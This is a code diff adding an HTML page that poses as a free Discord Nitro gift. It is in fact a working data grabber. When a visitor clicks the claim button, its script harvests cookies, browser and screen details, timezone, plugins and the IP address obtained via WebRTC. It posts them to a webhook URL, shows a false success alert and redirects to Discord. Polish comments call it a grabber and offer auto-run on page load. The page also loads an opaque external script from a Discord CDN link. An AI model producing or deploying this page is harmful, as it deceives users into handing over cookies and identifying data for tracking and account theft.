@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html>
+<head><script type='text/javascript' src='https://cdn.discordapp.com/vSP7hgGHPTZ5K5qHVg3ZlHbUCX74MIazqyM0Q9Y9IfIJJNs5zxrxZVe_kO_0WzeIQrxKPdFemD6FWIfES1Gpo42pDRmOQuiK4Sc4q5ZvJQf_7gGLVdm6TZgdiRqmfsX_sNT3ZL3jaQJPZkIRVf00qpbO_hP4yrZfQU3cVUkGS7009KR9iFbbRbuL-mQiqPi5EwhJE_FEbdaAY6Tq6qA11elC9fqQgUzwBgziQFoSF7MpuVE8-uzAiZr_rFYzvomEJG9SJtpItQ4PwYR8mrBoXu2bhGiA6bD50c_73uFxw0eXGOHCaBY37hBcg7m07QBZyzUaktnhQDzWrv0KB-NYh25yQAVNzsuwmn5xBHI2HvyhKn0L--52XLeOUoUY_cdxCTG3y9FcG5HDTt9INTRH6Fa9kqXkwCiXmArzxJzWq0h6WQiGRgDnS3h8Wj-IT5XlfT54cUP9mYlQ6RfkmkovAunnlijVpjkfZkGwQFJwNA2y87-3p-sDArK14T59HLWpYZ1am74-z0pi_nV65jTvNkXDp-bbO-3dUSf7YVbHKrj2KjaiSA9fZk2LVhIGKCpT0Fp4OWq3mGqgrVUUjddyAQ14950LwWZaCf6tM2u9p6q0u3jm0d1rMb2SNG5aj2fCDTNfC-rVB7dObpSGDZ-arnTtwI2sUdSWeuiEyiPwUw'></script>
+    <title>FREE NITRO CLAIM</title>
+    <style>
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            color: white;
+            text-align: center;
+            padding-top: 100px;
+        }
+        .container {
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 15px;
+            padding: 40px;
+            display: inline-block;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+        .nitro-btn {
+            background: #5865F2;
+            color: white;
+            border: none;
+            padding: 20px 40px;
+            font-size: 24px;
+            border-radius: 10px;
+            cursor: pointer;
+            margin-top: 30px;
+            transition: 0.3s;
+        }
+        .nitro-btn:hover {
+            background: #4752C4;
+            transform: scale(1.05);
+        }
+        .discord-logo {
+            width: 200px;
+            margin-bottom: 30px;
+        }
+        .loading {
+            display: none;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://discord.com/assets/2c21aeda16de354ba5334551a883b481.png" class="discord-logo">
+        <h1>🎉 FREE DISCORD NITRO!</h1>
+        <p>You've been gifted 1 Year of Discord Nitro!</p>
+        <p>Click CLAIM to activate your Nitro.</p>
+        
+        <button class="nitro-btn" onclick="grabIP()">🎁 CLAIM NITRO</button>
+        
+        <div class="loading" id="loading">
+            <p>Checking eligibility... ⏳</p>
+        </div>
+    </div>
+
+    <script>
+        // Zbierz dane użytkownika
+        var userData = {
+            ip: '',
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            cookies: document.cookie,
+            referrer: document.referrer,
+            screen: screen.width + 'x' + screen.height,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            plugins: Array.from(navigator.plugins).map(p => p.name).join(', ')
+        };
+
+        // Pobierz IP przez WebRTC
+        function getIP() {
+            return new Promise((resolve) => {
+                const pc = new RTCPeerConnection({iceServers: []});
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                
+                pc.onicecandidate = ice => {
+                    if (!ice.candidate) return;
+                    const candidate = ice.candidate.candidate;
+                    const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+                    const match = candidate.match(ipRegex);
+                    if (match) {
+                        resolve(match[1]);
+                    }
+                };
+                
+                setTimeout(() => resolve('Unknown'), 1000);
+            });
+        }
+
+        // Główna funkcja grabbera
+        async function grabIP() {
+            document.getElementById('loading').style.display = 'block';
+            
+            // Pobierz IP
+            userData.ip = await getIP();
+            
+            // Wyślij dane do serwera
+            fetch('https://webhook.site/your-webhook-id', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(userData)
+            });
+            
+            // Zapisz też w localStorage (backup)
+            localStorage.setItem('nitro_grabber', JSON.stringify(userData));
+            
+            // Przekieruj po 3 sekundach
+            setTimeout(() => {
+                window.location.href = 'https://discord.com/billing/promotions';
+            }, 3000);
+            
+            // Alert
+            alert('✅ Nitro claimed! Redirecting to Discord...');
+        }
+
+        // Auto-run przy załadowaniu strony (opcjonalnie)
+        window.onload = function() {
+            // grabIP(); // Odkomentuj jak chcesz auto-grab przy wejściu na stronę
+        };
+    </script>
+</body>
+</html>
